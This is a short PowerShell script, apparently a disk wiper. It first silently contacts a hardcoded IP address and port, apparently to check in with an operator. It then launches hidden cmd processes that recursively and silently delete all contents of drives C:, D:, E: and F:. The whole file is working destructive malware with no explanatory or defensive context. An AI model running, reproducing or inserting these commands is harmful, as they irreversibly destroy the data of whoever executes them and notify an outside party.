
$ProgressPreference = 'SilentlyContinue'; $null = iwr "http://95.163.88.140:2014/morgue" -UseBasicParsing
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q D:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q E:\") -PassThru -WindowStyle Hidden
Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q F:\") -PassThru -WindowStyle Hidden
